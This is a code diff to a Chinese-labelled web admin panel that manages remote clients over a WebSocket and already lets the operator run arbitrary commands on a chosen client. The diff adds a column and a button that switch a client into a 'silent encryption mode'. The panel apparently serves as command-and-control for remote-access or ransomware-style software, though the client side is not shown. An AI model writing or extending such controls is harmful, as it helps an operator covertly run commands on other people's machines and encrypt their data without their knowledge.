@@ -52,6 +52,7 @@
                     <th>Connected</th>
                     <th>OpenFlag</th>
                     <th>WITE_TIME</th>
+                    <th>MODE</th>
                     <th>Last Active</th>
                     <th>操作</th>
                 </tr>
@@ -157,10 +158,12 @@
         <td>${c.isconnected ? "在线" : "离线"}</td>
         <td>${c.openFlag}</td>
         <td>${c.WITE_tIME}</td>
+        <td>${c.mode}</td>
         <td>${new Date(c.lastActive).toLocaleString()}</td>
         <td>
             <button onclick="setClientOpenFlag('${c.clientId}', ${!c.openFlag})">${c.openFlag ? "关闭" : "开启"}</button>
             <button onclick="setClientWite('${c.clientId}')">设置WITE</button>
+            <button onclick="setMode('${c.clientId}')">设置MODE</button>
             <button onclick="execCmd('${c.clientId}')">执行CMD</button>
 
         </td>
@@ -216,6 +219,19 @@
                 type: "EXEC_CMD",
                 clientId,
                 cmd
+            }));
+        }
+        function setMode(clientId) {
+            const m = prompt("请输入模式 (0 = 普通模式, 1 = 静默加密模式)：");
+            if (m !== "0" && m !== "1") {
+                alert("必须为 0 或 1");
+                return;
+            }
+
+            ws.send(JSON.stringify({
+                type: "SET_MODE",
+                clientId,
+                mode: parseInt(m)
             }));
         }
 
